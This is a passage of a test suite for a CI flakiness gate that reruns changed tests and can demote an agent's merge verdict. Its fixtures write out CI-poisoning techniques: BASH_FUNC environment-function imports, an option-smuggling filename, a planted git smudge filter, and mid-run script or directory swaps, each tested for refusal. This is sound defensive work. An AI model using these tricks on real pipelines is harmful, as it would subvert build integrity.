    assert.match(
      log,
      /not present in the merge tree, skipped: scripts\/tests\/ghost\.test\.js/,
    );
    assert.match(
      outputs.flake_summary,
      /^1 changed test file\(s\)/,
      'the summary must count only the runnable file',
    );
  });

  it('a working home that is not exclusively ours fails closed to `error`', () => {
    // R7-8: $RUNNER_TEMP's top level is uid-1000 writable and the
    // container's `node` is uid 1000, so a group/other-accessible home is
    // one a PR could have planted files in — the gate must refuse to read
    // it rather than sample attacker-chosen bytes, and must still exit 0.
    const { res, outputs } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\n',
      gateHomeMode: 0o777,
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'error');
    assert.match(
      outputs.flake_summary,
      /not root-owned 0700|working directory/,
    );
  });

  it('a missing recorded list degrades to the `error` verdict, exit 0', () => {
    const { res, outputs } = runGate({ layout: UNIT, list: null });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'error');
  });

  it('out-of-scope families are skipped with logged reasons and land `n/a`', () => {
    const { res, outputs, log } = runGate({
      layout: {
        'integration-tests/x.test.ts': '',
        'packages/web/client/e2e/y.spec.ts': '',
        'packages/bunpkg/package.json': '{}',
        'packages/bunpkg/z.test.ts': '',
      },
      list: [
        'integration-tests/x.test.ts',
        'packages/web/client/e2e/y.spec.ts',
        'packages/bunpkg/z.test.ts',
        '',
      ].join('\n'),
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'n/a');
    assert.match(log, /integration test, out of gate scope/);
    assert.match(log, /e2e suite, out of gate scope/);
    assert.match(log, /no vitest config \(unsupported runner family\)/);
  });

  it('vite.config-only packages and root workspaces outside packages/** are RUN, not skipped', () => {
    // packages/webui's only config is vite.config.ts (vitest resolves it),
    // and integrations/external-context is a root npm workspace no path
    // prefix covers — both are CI-tested, so the gate must re-run them
    // through their owning package instead of logging them out of scope.
    const { res, outputs, log } = runGate({
      layout: {
        'packages/webui/package.json': '{}',
        'packages/webui/vite.config.ts': '',
        'packages/webui/src/x.test.ts': '',
        'integrations/external-context/package.json': '{}',
        'integrations/external-context/vitest.config.ts': '',
        'integrations/external-context/src/y.test.ts': '',
        'packages/wspkg/package.json': '{}',
        'packages/wspkg/vitest.workspace.ts': '',
        'packages/wspkg/src/z.test.ts': '',
      },
      list: [
        'packages/webui/src/x.test.ts',
        'integrations/external-context/src/y.test.ts',
        'packages/wspkg/src/z.test.ts',
        '',
      ].join('\n'),
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(
      log,
      /\(cd packages\/wspkg\) npx --no-install vitest run \.\/src\/z\.test\.ts/,
      'a vitest.workspace.ts-only package must be entered and run',
    );
    assert.match(
      log,
      /\(cd packages\/webui\) npx --no-install vitest run \.\/src\/x\.test\.ts/,
      'a vite.config-only package must be entered and run',
    );
    assert.match(
      log,
      /\(cd integrations\/external-context\) npx --no-install vitest run \.\/src\/y\.test\.ts/,
      'a root workspace outside packages/** must be entered and run',
    );
    assert.doesNotMatch(log, /, skipped:/);
  });

  it('scripts/tests files outside the pinned vitest include set are skipped, not mis-run', () => {
    // The pinned config only includes *.test.{js,ts}: an admitted .spec.js
    // or .test.mjs would fail collection EVERY round otherwise and publish
    // a bogus consistent-fail.
    const { res, outputs, log } = runGate({
      layout: {
        'scripts/tests/probe.spec.js': '',
        'scripts/tests/probe.test.mjs': '',
        'scripts/tests/probe.test.js': '',
      },
      list: 'scripts/tests/probe.spec.js\nscripts/tests/probe.test.mjs\nscripts/tests/probe.test.js\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(
      log,
      /not in the scripts\/tests vitest include set \(\*\.test\.\{js,ts\}\), skipped: scripts\/tests\/probe\.spec\.js/,
    );
    assert.match(
      log,
      /not in the scripts\/tests vitest include set \(\*\.test\.\{js,ts\}\), skipped: scripts\/tests\/probe\.test\.mjs/,
    );
    assert.match(
      log,
      /\(cd \.\) npx --no-install vitest run --config \.\/scripts\/tests\/vitest\.config\.ts \.\/scripts\/tests\/probe\.test\.js/,
      'the admitted .test.js file must still run',
    );
  });

  it('a nested-workspace file runs from its OWN package, and a leading-dash filename stays an operand', () => {
    const { res, outputs, log } = runGate({
      layout: {
        'packages/channels/base/package.json': '{}',
        'packages/channels/base/vitest.config.ts': '',
        'packages/channels/base/src/p.test.ts': '',
        'scripts/tests/--config=evil.test.js': '',
      },
      list: 'packages/channels/base/src/p.test.ts\nscripts/tests/--config=evil.test.js\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(
      log,
      /\(cd packages\/channels\/base\) npx --no-install vitest run \.\/src\/p\.test\.ts/,
      'the nested package must be entered itself, not its parent',
    );
    assert.match(
      log,
      /\.\/scripts\/tests\/--config=evil\.test\.js/,
      'operands must be ./-prefixed so vitest cannot parse them as options',
    );
  });

  it('an abort before any verdict still fails open via the EXIT trap', () => {
    // RUNNER_TEMP unset kills the script at ${RUNNER_TEMP:?} before a
    // verdict exists; the trap must rewrite that ending into the fixed
    // error outputs and a zero exit (fail-open, never a red step).
    const { res, outputs } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\n',
      env: { RUNNER_TEMP: undefined },
    });
    assert.equal(
      res.status,
      0,
      `the trap must convert the abort to exit 0: ${res.stderr}`,
    );
    assert.equal(outputs.flake_verdict, 'error');
    assert.match(outputs.flake_summary, /aborted before reaching a verdict/);
  });

  it('the .github/scripts node --test arm runs and is logged', () => {
    const { res, outputs, log } = runGate({
      layout: { '.github/scripts/foo.test.mjs': '' },
      list: '.github/scripts/foo.test.mjs\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(log, /node --test \.\/\.github\/scripts\/foo\.test\.mjs/);
  });

  it('FLAKE_ROUNDS is parsed and clamped (default 5, floor 2, cap 10)', () => {
    const roundsInLog = ({ log }) => {
      const m = log.match(/^rounds=(\d+)/m);
      assert.ok(m, 'the gate log header must carry the rounds count');
      return m[1];
    };
    for (const [env, expected] of [
      [{ FLAKE_ROUNDS: undefined }, '5'],
      [{ FLAKE_ROUNDS: 'abc' }, '5'],
      [{ FLAKE_ROUNDS: '99' }, '10'],
    ]) {
      const r = runGate({
        layout: UNIT,
        list: 'scripts/tests/a.test.js\n',
        env,
      });
      assert.equal(r.res.status, 0, r.res.stderr);
      assert.equal(
        roundsInLog(r),
        expected,
        `FLAKE_ROUNDS=${JSON.stringify(env)} must clamp to ${expected}`,
      );
    }
    // The floor is load-bearing: classification needs at least two marks,
    // so at rounds=1 divergence is impossible by construction and every
    // flaky PR would read as pass.
    const floored = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\n',
      sequences: { 'a.test.js': 'PF' },
      env: { FLAKE_ROUNDS: '1' },
    });
    assert.equal(floored.res.status, 0, floored.res.stderr);
    assert.equal(roundsInLog(floored), '2');
    assert.equal(floored.outputs.flake_verdict, 'flaky');
  });

  describe('round-19 startup-channel hardening (behavioral)', () => {
    it('a BASH_FUNC_set%% import never runs — POSIXLY_CORRECT refuses it at bash startup', () => {
      // R18-2: without POSIX mode at INVOCATION the import runs attacker
      // code as root on the step's first command, and can even enable
      // posix itself so the reserved-word refusal never fires
      // (probe-verified). The harness applies the step env block, so the
      // step's POSIXLY_CORRECT reaches bash exactly as in production.
      const marker = join(scenarioRoot, 'set-poison-marker');
      const { res, outputs } = runGate({
        layout: UNIT,
        list: 'scripts/tests/a.test.js\n',
        env: {
          'BASH_FUNC_set%%': `() { command touch "${marker}"; command set "$@"; command set -o posix; }`,
        },
      });
      assert.notEqual(
        res.status,
        0,
        'a poisoned startup must fail the step red at bash startup',
      );
      assert.ok(
        !existsSync(marker),
        'the poisoned set function must never execute — the import is refused before the body starts',
      );
      assert.equal(
        outputs.flake_verdict,
        undefined,
        'bash aborts at import (exit 2), before the fail-open verdict path — the abort IS the refusal',
      );
    });

    it('echo stays shadowable even in POSIX mode — refusal writes must stay slash-pathed', () => {
      // R18-3 mechanism pin: function lookup precedes REGULAR builtins;
      // only SPECIAL builtins outrank functions (probe-verified). This is
      // why every pre-re-exec refusal writes through /usr/bin/printf.
      const poisonEnv = {
        ...process.env,
        'BASH_FUNC_echo%%': '() { builtin printf "FORGED\\n"; }',
      };
      const shadowed = spawnSync(
        'bash',
        ['--noprofile', '--norc', '--posix', '-c', 'echo first; echo second'],
        { env: poisonEnv, encoding: 'utf8' },
      );
      assert.equal(shadowed.stdout, 'FORGED\nFORGED\n');
      const pathed = spawnSync(
        'bash',
        [
          '--noprofile',
          '--norc',
          '--posix',
          '-c',
          '/usr/bin/printf "%s\\n" honest',
        ],
        { env: poisonEnv, encoding: 'utf8' },
      );
      assert.equal(pathed.stdout, 'honest\n');
    });

    it('a planted EUID cannot move the root identity gates (kernel-queried)', () => {
      // R18-4: extract the gate's poisoned-env refusal condition verbatim
      // and drive it under spoofed EUID values from a non-root process.
      // The kernel query must ignore the spoof; the pre-round $EUID shape
      // fired on a planted EUID=0 and skipped on a planted EUID=1000.
      const cond = flakeRunVerbatim.match(
        /^\s*if (\[\[ [^\n]*\/usr\/bin\/id -u[^\n]*\]\] && \[\[ -n \$\{BASH_ENV:-\}[^\n]*\]\]); then$/m,
      );
      assert.ok(
        cond,
        'the gate poisoned-env refusal must key its identity conjunct on /usr/bin/id -u',
      );
      const drive = (extra) =>
        spawnSync(
          'bash',
          [
            '--noprofile',
            '--norc',
            '-c',
            `if ${cond[1]}; then printf FIRED; else printf SKIPPED; fi`,
          ],
          {
            env: { ...process.env, BASH_ENV: '/dev/null', ...extra },
            encoding: 'utf8',
          },
        );
      assert.equal(
        drive({ EUID: '0' }).stdout,
        'SKIPPED',
        'a planted EUID=0 must not fire a root-gated refusal for a non-root process',
      );
      assert.equal(
        drive({ EUID: '1000' }).stdout,
        'SKIPPED',
        'a planted EUID=1000 changes nothing either — identity comes from the kernel',
      );
    });

    it('a script swap between bash open and the re-exec snapshot is refused by the inode anchor', () => {
      // R18-1: model the window deterministically by swapping the script
      // from its own first line — fd 255 already holds the genuine inode
      // when the swap lands, exactly the state an external watcher
      // produces by racing the kill (a swap before bash opens is the one
      // case no step-level defence can catch: bash would execute the
      // plant directly). Pre-round, the snapshot re-open read the plant
      // and the re-exec ran it.
      const caseBlock = flakeRunVerbatim.match(
        /^\s*case "\$\{1:-\}" in\n[\s\S]*?\n\s*esac$/m,
      );
      assert.ok(caseBlock, 'the gate re-exec case block must exist');
      const root = mkdtempSync(join(scenarioRoot, 'anchor-'));
      const script = join(root, 'gate-arm.sh');
      const plantMarker = join(root, 'plant-marker');
      const swapLines = [
        'mv -- "$0" "$0.genuine"',
        `printf '%s\\n' 'printf "PLANT-EXECUTED\\n" > "${plantMarker}"' > "$0"`,
      ];
      writeFileSync(script, `${swapLines.join('\n')}\n${caseBlock[0]}\n`);
      const out = join(root, 'github-output');
      writeFileSync(out, '');
      const res = spawnSync(
        'bash',
        ['--noprofile', '--norc', '-e', '-o', 'pipefail', script],
        {
          cwd: root,
          env: {
            ...process.env,
            GITHUB_OUTPUT: out,
            RUNNER_TEMP: root,
            GITHUB_STEP_SUMMARY: join(root, 'summary'),
          },
          encoding: 'utf8',
          timeout: 30_000,
        },
      );
      assert.equal(res.status, 0, `the gate refusal is fail-open: ${res.stderr}`);
      const outputs = Object.fromEntries(
        readFileSync(out, 'utf8')
          .split('\n')
          .filter((l) => l.includes('='))
          .map((l) => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]),
      );
      assert.equal(outputs.flake_verdict, 'error');
      assert.match(
        outputs.flake_summary,
        /step script changed between open and re-exec snapshot/,
      );
      assert.ok(
        !existsSync(plantMarker),
        'the swapped-in script body must never execute',
      );
    });
  });

  it('publisher demotion executes one-way: only `flaky` demotes, and it MUST demote', () => {
    const block = publishRun.match(
      /^\s*case "\$\{FLAKE_VERDICT:-\}" in[\s\S]*?^\s*esac$/m,
    );
    assert.ok(block, 'the publisher must map FLAKE_VERDICT in a case block');
    const drive = (verdict) => {
      const res = spawnSync(
        'bash',
        [
          '--noprofile',
          '--norc',
          '-e',
          '-o',
          'pipefail',
          '-c',
          [
            "QUAL='✅ passed'",
            "QUAL_ZH='✅ 通过'",
            "HEADLINE='merge-ready (agent verdict)'",
            "HEADLINE_ZH='可合入'",
            "FLAKE_LINE=''",
            "FLAKE_LINE_ZH=''",
            block[0],
            'printf \'%s|%s|%s|%s|%s|%s\' "$QUAL" "$HEADLINE" "$QUAL_ZH" "$HEADLINE_ZH" "$FLAKE_LINE" "$FLAKE_LINE_ZH"',
          ].join('\n'),
        ],
        {
          env: {
            ...process.env,
            FLAKE_VERDICT: verdict,
            FLAKE_SUMMARY: '1 of 2 changed test file(s) diverged',
          },
          encoding: 'utf8',
          timeout: 15_000,
        },
      );
      assert.equal(res.status, 0, res.stderr);
      return res.stdout;
    };
    // Both language pairs are asserted (round 4): the Chinese summary line
    // is the ONE verdict a collapsed-details reader sees — if the _ZH
    // assignments drop, a demoted PR renders `判定：✅ 通过` in Chinese
    // while the English headline says ❌.
    // The fifth and sixth fields pin BOTH gate status lines (rounds 5-6):
    // informational verdicts must render their lines without touching the
    // headline, the flaky lines must carry the ❌, and the Chinese line —
    // the one verdict a collapsed-details reader sees — must never drop
    // out while the English one keeps the suite green.
    // R16-4 interim: this case block only executes on the full-report
    // path, where the gate step ran and owes a verdict — an empty or
    // unrecognized value means the uid-1000-writable $GITHUB_OUTPUT
    // backing channel corrupted it in transit, and must render a visible
    // fixed-text error line instead of dropping silently. The exact-equality
    // assertion below also proves a planted value never lands in the body.
    const CHANNEL_ERROR_LINE =
      'Flakiness gate: ⚠️ error — the gate verdict was missing or unrecognized at publish time; treating the gate as errored';
    const CHANNEL_ERROR_LINE_ZH =
      '抖动门：⚠️ error — 发布时门判定缺失或无法识别，按 error 处理';
    for (const [v, line, zh] of [
      ['', CHANNEL_ERROR_LINE, CHANNEL_ERROR_LINE_ZH],
      ['planted-garbage', CHANNEL_ERROR_LINE, CHANNEL_ERROR_LINE_ZH],
      [
        'pass',
        'Flakiness gate: ✅ 1 of 2 changed test file(s) diverged',
        '抖动门：✅ 1 of 2 changed test file(s) diverged',
      ],
      [
        'n/a',
        'Flakiness gate: not applicable — 1 of 2 changed test file(s) diverged',
        '抖动门：不适用 — 1 of 2 changed test file(s) diverged',
      ],
      [
        'consistent-fail',
        'Flakiness gate: ⚠️ consistent-fail — 1 of 2 changed test file(s) diverged',
        '抖动门：⚠️ consistent-fail — 1 of 2 changed test file(s) diverged',
      ],
      [
        'timeout',
        'Flakiness gate: ⚠️ timeout — 1 of 2 changed test file(s) diverged',
        '抖动门：⚠️ timeout — 1 of 2 changed test file(s) diverged',
      ],
      [
        'error',
        'Flakiness gate: ⚠️ error — 1 of 2 changed test file(s) diverged',
        '抖动门：⚠️ error — 1 of 2 changed test file(s) diverged',
      ],
    ]) {
      assert.equal(
        drive(v),
        `✅ passed|merge-ready (agent verdict)|✅ 通过|可合入|${line}|${zh}`,
        `'${v}' must not touch the headline in either language`,
      );
    }
    assert.equal(
      drive('flaky'),
      '❌ not passed|non-deterministic tests (flakiness gate)|❌ 不通过|测试结果不确定（抖动门）|Flakiness gate: ❌ 1 of 2 changed test file(s) diverged|抖动门：❌ 1 of 2 changed test file(s) diverged',
      'flaky must demote in BOTH languages — deleting either pair or status line has to fail this test',
    );
  });

  it('a test that commits mid-invocation cannot move the restore baseline (pinned OID)', () => {
    // Round 11 (R4-1): the deterministic shape 'pass while the marker
    // is absent, then commit the marker' passes round 1, and every
    // later reset restores from the moved HEAD — the committed marker
    // becomes the pristine baseline (PFFFF -> false flaky). reset
    // --hard to the OID pinned before the loop drops it (PPPPP).
    const STUB_COMMITTING = [
      '#!/bin/bash',
      'if [ -f marker.txt ]; then',
      '  echo "marker survived the reset"',
      '  exit 1',
      'fi',
      'echo committed > marker.txt',
      'git add marker.txt',
      'git -c user.name=att -c user.email=att@local commit -qm marker',
      'exit 0',
      '',
    ].join('\n');
    const { res, outputs, log } = runGate({
      layout: { 'scripts/tests/committing.test.js': '' },
      list: 'scripts/tests/committing.test.js\n',
      stubs: { npx: STUB_COMMITTING },
      git: true,
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(log, /committing\.test\.js: PPPPP/);
  });

  it('a smudge filter planted in .git cannot rewrite restored content per round', () => {
    // Round 11 (R4-2): checkout/clean never touch .git, so a filter
    // planted during a round survives every reset and executes inside
    // the NEXT reset's own restore — even the same round's pre-reader
    // restore runs through it, so the reader sees FILTERED content in
    // EVERY round (FFFFF -> bogus consistent-fail, published as
    // "deterministic, CI owns that signal"). The reset sanitizes
    // .git's execution vectors first (PPPPP).
    const STUB_FILTER = [
      '#!/bin/bash',
      'f="${@: -1}"',
      'case "$f" in',
      '  ./scripts/tests/plant.test.js)',
      '    git config filter.evil.smudge "sed s/pristine/FILTERED/"',
      '    mkdir -p .git/info',
      '    echo "fixture.txt filter=evil" > .git/info/attributes',
      '    echo noise >> fixture.txt',
      '    exit 0',
      '    ;;',
      '  ./scripts/tests/reader.test.js)',
      '    if grep -q FILTERED fixture.txt; then',
      '      echo "sampled filter-rewritten content"',
      '      exit 1',
      '    fi',
      '    exit 0',
      '    ;;',
      'esac',
      'exit 1',
      '',
    ].join('\n');
    const { res, outputs, log } = runGate({
      layout: {
        'scripts/tests/plant.test.js': '',
        'scripts/tests/reader.test.js': '',
        'fixture.txt': 'pristine\n',
      },
      list: 'scripts/tests/plant.test.js\nscripts/tests/reader.test.js\n',
      stubs: { npx: STUB_FILTER },
      git: true,
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(log, /plant\.test\.js: PPPPP/);
    assert.match(log, /reader\.test\.js: PPPPP/);
  });

  it('a reset failure after samples keeps the verdict the rounds earned', () => {
    // Round 11 (R8-9): divergence is sampled (P,F), then residue that
    // defeats `git clean -ffd` (a chmod-500 dir) fails the next reset.
    // The collected results are honest — classification must still
    // land the flaky verdict; discarding them publishes `error` and
    // the PR escapes its demotion.
    const STUB_POISON = [
      '#!/bin/bash',
      'n_file="$FLAKE_SEQ_DIR/.count-poison"',
      'n=$(cat "$n_file" 2>/dev/null || echo 0)',
      'echo $((n+1)) > "$n_file"',
      'if [ "$n" -eq 1 ]; then',
      '  mkdir -p poison',
      '  touch poison/f',
      '  chmod 500 poison',
      '  exit 1',
      'fi',
      'exit 0',
      '',
    ].join('\n');
    const { res, outputs, log } = runGate({
      layout: { 'scripts/tests/poison.test.js': '' },
      list: 'scripts/tests/poison.test.js\n',
      stubs: { npx: STUB_POISON },
      git: true,
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'flaky');
    assert.match(log, /scripts\/tests\/poison\.test\.js: PF$/m);
    assert.match(log, /sampling stopped/);
  });

  it('a reset failure before two full rounds carries no flakiness signal either way', () => {
    // Round 14 (R11-3/R13-3): the deadline path has always degraded
    // sub-2-round sampling to the informational timeout verdict; the
    // reset-failure early stop must do the same. Round 1 passes and
    // plants residue that defeats `git clean -ffd`, failing the next
    // reset — classifying one agreeing round as `pass` would certify
    // a ~50% flake that happened to pass its single sample.
    const STUB_POISON_PASS = [
      '#!/bin/bash',
      'n_file="$FLAKE_SEQ_DIR/.count-poisonpass"',
      'n=$(cat "$n_file" 2>/dev/null || echo 0)',
      'echo $((n+1)) > "$n_file"',
      'if [ "$n" -eq 0 ]; then',
      '  mkdir -p poison',
      '  touch poison/f',
      '  chmod 500 poison',
      'fi',
      'exit 0',
      '',
    ].join('\n');
    const { res, outputs, log } = runGate({
      layout: { 'scripts/tests/poisonpass.test.js': '' },
      list: 'scripts/tests/poisonpass.test.js\n',
      stubs: { npx: STUB_POISON_PASS },
      git: true,
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'timeout');
    assert.match(outputs.flake_summary, /no flakiness signal either way/);
    assert.match(log, /sampling stopped/);
  });

  it('a home swapped mid-run fails closed instead of sampling through the plant', () => {
    // Round 11 (R8-1) + round 14 (R12-1): rename(2) needs write on the
    // PARENT directory — the uid-1000 $RUNNER_TEMP top level grants it,
    // so the 0700 home cannot stop its own entry being swapped after
    // the one-time validation. The stub swaps the home during round 1;
    // the identity re-check before the next output open must stop the
    // sampling (-O passes on the harness user, so only the recorded
    // identity catches the plant). With only agreeing samples collected
    // the stop lands the sub-2-round timeout verdict — never the old
    // `error`, which discarded honest samples.
    const STUB_SWAPPER = [
      '#!/bin/bash',
      'f="${@: -1}"',
      'case "$f" in',
      '  ./scripts/tests/swapper.test.js)',
      '    if [ ! -e "$RUNNER_TEMP/flake-gate.real" ]; then',
      '      mv "$RUNNER_TEMP/flake-gate" "$RUNNER_TEMP/flake-gate.real"',
      '      mkdir "$RUNNER_TEMP/flake-gate"',
      '      chmod 700 "$RUNNER_TEMP/flake-gate"',
      '    fi',
      '    exit 0',
      '    ;;',
      'esac',
      'exit 0',
      '',
    ].join('\n');
    const { res, outputs } = runGate({
      layout: {
        'scripts/tests/a.test.js': '',
        'scripts/tests/swapper.test.js': '',
      },
      list: 'scripts/tests/a.test.js\nscripts/tests/swapper.test.js\n',
      stubs: { npx: STUB_SWAPPER },
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'timeout');
    assert.match(outputs.flake_summary, /no flakiness signal either way/);
  });

  it('a home swapped after a computed divergence still demotes', () => {
    // Round 14 (R12-1): samples already collected are honest — the
    // swap must stop the sampling and classify them, because
    // publishing `error` instead lets a PR dodge its demotion by
    // renaming the home after the first divergent sample. a.test.js
    // diverges F-then-P in rounds 1-2; the home is swapped during
    // round 2, after the divergence is already collected.
    const STUB_SWAPPER = [
      '#!/bin/bash',
      'f="${@: -1}"',
      'case "$f" in',
      '  ./scripts/tests/a.test.js)',
      '    n_file="$FLAKE_SEQ_DIR/.count-a"',
      '    n=$(cat "$n_file" 2>/dev/null || echo 0)',
      '    echo $((n+1)) > "$n_file"',
      '    seq="$(cat "$FLAKE_SEQ_DIR/a.test.js" 2>/dev/null || echo P)"',
      '    [ "${seq:$((n % ${#seq})):1}" = F ] && exit 1',
      '    exit 0',
      '    ;;',
      '  ./scripts/tests/swapper.test.js)',
      '    n_file="$FLAKE_SEQ_DIR/.count-swapper"',
      '    n=$(cat "$n_file" 2>/dev/null || echo 0)',
      '    echo $((n+1)) > "$n_file"',
      '    if [ "$n" -eq 1 ] && [ ! -e "$RUNNER_TEMP/flake-gate.real" ]; then',
      '      mv "$RUNNER_TEMP/flake-gate" "$RUNNER_TEMP/flake-gate.real"',
      '      mkdir "$RUNNER_TEMP/flake-gate"',
      '      chmod 700 "$RUNNER_TEMP/flake-gate"',
      '    fi',
      '    exit 0',
      '    ;;',
      'esac',
      'exit 1',
      '',
    ].join('\n');
    const { res, outputs, log } = runGate({
      layout: {
        'scripts/tests/a.test.js': '',
        'scripts/tests/swapper.test.js': '',
      },
      list: 'scripts/tests/a.test.js\nscripts/tests/swapper.test.js\n',
      sequences: { 'a.test.js': 'FP' },
      stubs: { npx: STUB_SWAPPER },
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'flaky');
    assert.match(outputs.flake_summary, /returned different results/);
    assert.match(log, /a\.test\.js: FP/);
  });

  it('a BASH_FUNC_[%% import never reaches the pre-exec decisions — POSIXLY_CORRECT kills it at startup', () => {
    // Round 15 pinned the second layer: a poisoned `[` that survived
    // import still failed closed on the reserved-word decisions. Round
    // 19's POSIXLY_CORRECT closes the class one layer earlier: POSIX
    // mode at INVOCATION refuses the `[` import (probe-verified), and
    // under the runner wrapper's `-e` the step then dies red before its
    // first command — the poison never runs, no round is sampled, no
    // verdict is forged. The second layer is unreachable by construction
    // while the step env carries POSIXLY_CORRECT (pinned above).
    const { res, outputs, counts } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\n',
      gateHomeMode: 0o777,
      env: { 'BASH_FUNC_[%%': '() { ((_p_n=${_p_n:-0}+1)); (( _p_n > 3 )); }' },
    });
    assert.notEqual(res.status, 0, 'a poisoned startup must fail the step red');
    assert.match(
      res.stderr,
      /error importing function definition for `\['/,
      'bash must refuse the `[` import at startup',
    );
    assert.equal(
      outputs.flake_verdict,
      undefined,
      'no verdict may be written on a poisoned startup',
    );
    assert.equal(counts('a.test.js'), 0, 'no round may run on a poisoned startup');
  });

  it('a BASH_FUNC_exec%% import cannot skip the env -i re-exec — bash refuses it at startup', () => {
    // Round 15 pinned the second layer: POSIX mode resolves the SPECIAL
    // builtin `exec` before functions. Round 19's POSIXLY_CORRECT closes
    // the class one layer earlier: `exec` being special, bash refuses
    // the import outright at startup (probe-verified: exit 2, body never
    // runs) — the poisoned parent fall-through is unreachable by
    // construction while the step env carries POSIXLY_CORRECT (pinned
    // above).
    const { res, outputs, counts } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\n',
      sequences: { 'a.test.js': 'PPPPP' },
      env: { 'BASH_FUNC_exec%%': '() { return 0; }' },
    });
    assert.notEqual(res.status, 0, 'a poisoned startup must fail the step red');
    assert.match(
      res.stderr,
      /`exec': is a special builtin/,
      'bash must refuse the special-builtin import at startup',
    );
    assert.equal(
      outputs.flake_verdict,
      undefined,
      'no verdict may be written on a poisoned startup',
    );
    assert.equal(counts('a.test.js'), 0, 'the body must never run on a poisoned startup');
  });

  it('a same-stem sibling (X.test.tsx next to changed X.test.ts) runs in ONE merged group, never attributed separately', () => {
    // vitest's positional filters are lowercase SUBSTRING matches on
    // root-relative paths — verified against the installed vitest: one
    // filter collects both files of the same-stem pairs in this repo,
    // so the sibling's outcome rides in the changed file's invocation
    // (manufactured divergence, or masked flakiness).
    const pair = {
      'packages/pkga/package.json': '{}',
      'packages/pkga/vitest.config.ts': '',
      'packages/pkga/src/x.test.ts': '',
      'packages/pkga/src/x.test.tsx': '',
    };
    const both = runGate({
      layout: pair,
      list: 'packages/pkga/src/x.test.ts\npackages/pkga/src/x.test.tsx\n',
    });
    assert.equal(both.res.status, 0, both.res.stderr);
    assert.equal(both.outputs.flake_verdict, 'pass');
    assert.match(
      both.log,
      /file packages\/pkga\/src\/x\.test\.ts \+ packages\/pkga\/src\/x\.test\.tsx:/,
      'the merged group label must name both files',
    );
    assert.match(
      both.log,
      /substring-colliding sibling[\s\S]*?: packages\/pkga\/src\/x\.test\.tsx/,
      'the sibling must be skip-logged when the list reaches it',
    );
    assert.match(
      both.outputs.flake_summary,
      /^1 changed test file\(s\)/,
      'the summary must count one merged group, not two files',
    );
    assert.equal(
      both.counts('x.test.ts'),
      5,
      'the merged group ran five rounds under the changed file operand',
    );
    assert.equal(
      both.counts('x.test.tsx'),
      0,
      'the sibling never ran under its own operand',
    );
    // A changed .tsx with an unchanged .ts twin collects no sibling —
    // it stays its own group with no merge.
    const tsxOnly = runGate({
      layout: pair,
      list: 'packages/pkga/src/x.test.tsx\n',
    });
    assert.equal(tsxOnly.res.status, 0, tsxOnly.res.stderr);
    assert.equal(tsxOnly.outputs.flake_verdict, 'pass');
    assert.doesNotMatch(tsxOnly.log, /substring-colliding sibling/);
    assert.doesNotMatch(tsxOnly.log, /x\.test\.ts \+/);
    assert.equal(tsxOnly.counts('x.test.tsx'), 5);
  });
});
describe('qwen-triage: flakiness gate staging/upload — behavioral, under the production wrapper', () => {
  // The structural pins cannot observe whether a DETECTED swap is also
  // CLEANED UP — a set -e abort used to leave the swapped-in tree for
  // the always() upload to enumerate (R12-2 entrances 1+3).
  const stageStep = verifyJob.steps.find(
    (s) => s.name === 'Stage flakiness gate log for upload',
  );
  const recheckStep = verifyJob.steps.find(
    (s) => s.id === 'flake-upload-check',
  );

  const stageRoot = mkdtempSync(join(tmpdir(), 'flake-staging-'));
  after(() => {
    // Same safeguard as the gate suite's hook: a scenario that leaves a
    // mode-500 directory behind makes rmSync throw EACCES (force
    // suppresses ENOENT only), marking the whole suite hookFailed and
    // leaking the tree; restore owner permissions first.
    spawnSync('chmod', ['-R', 'u+rwx', stageRoot]);
    rmSync(stageRoot, { recursive: true, force: true });
  });

  const makeHome = (rt, { runId = '777-1', files = {} } = {}) => {
    const home = join(rt, 'flake-gate');
    mkdirSync(home, { recursive: true });
    chmodSync(home, 0o700);
    writeFileSync(join(home, 'run-id'), runId);
    for (const [name, content] of Object.entries(files)) {
      writeFileSync(join(home, name), content);
    }
    return home;
  };

  const runStaging = (rt, bin) => {
    const scriptFile = join(rt, 'staging.sh');
    // Same fixture relocation as the gate harness: the home is a
    // hard-coded container-root constant in production (an env knob there
    // would be PR-reachable), so the suite moves that one constant into
    // its scratch tree and pins the production value structurally.
    writeFileSync(
      scriptFile,
      stageStep.run.replaceAll(
        'GATE_DIR=/flake-gate',
        `GATE_DIR=${join(rt, 'flake-gate')}`,
      ),
    );
    const out = join(rt, 'github-output');
    writeFileSync(out, '');
    return spawnSync(
      'bash',
      ['--noprofile', '--norc', '-e', '-o', 'pipefail', scriptFile],
      {
        env: {
          ...process.env,
          // Step-env parity with the gate harness (POSIXLY_CORRECT
          // startup defence included) — literal values only.
          ...Object.fromEntries(
            Object.entries(stageStep.env).filter(
              ([, v]) => typeof v === 'string' && !v.includes('${{'),
            ),
          ),
          PATH: `${bin}:${process.env.PATH}`,
          RUNNER_TEMP: rt,
          GITHUB_OUTPUT: out,
          GITHUB_STEP_SUMMARY: join(rt, 'github-summary'),
          GITHUB_RUN_ID: '777',
